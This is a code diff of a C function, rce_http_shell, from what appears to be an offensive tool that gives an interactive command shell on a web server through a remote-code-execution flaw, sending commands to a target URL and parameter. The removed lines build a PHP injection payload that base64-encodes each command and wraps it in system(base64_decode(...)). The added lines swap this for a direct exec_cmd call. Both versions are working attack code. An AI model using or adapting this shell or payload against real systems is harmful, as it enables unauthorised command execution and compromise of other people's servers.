@@ -1,13 +1,13 @@
-#include "fun/exec-php-code.h"
-#include "string/base64.h"
-#include "memory/alloc.h"
+#include "fun/http-shell.h"
+#include "fun/exec-cmd.h"
 
 #include <stdio.h>
 #include <string.h>
+#include <stdlib.h>
 
 void rce_http_shell(const char *url, const char *parameter, int technique)
 {
-	char *ptr = NULL, *code;
+	char *ptr = NULL;
 	size_t size = 0;
 	ssize_t n;
 
@@ -31,19 +31,11 @@ void rce_http_shell(const char *url, const char *parameter, int technique)
 			break;
 		}
 
-		char *b64cmd = b64encode(ptr, n);
-		xmalloc(code, strlen(b64cmd) + 36);
-
-		sprintf(code, "<?php system(base64_decode(\"%s\")); ?>", b64cmd);
-
-		char *rce = exec_php_code(url, parameter, code, technique);
+		char *rce = exec_cmd(url, parameter, ptr, technique);
 		if (rce) {
 			printf("%s", rce);
 			free(rce);
 		}
-
-		free(b64cmd);
-		free(code);
 	}
 
 	free(ptr);
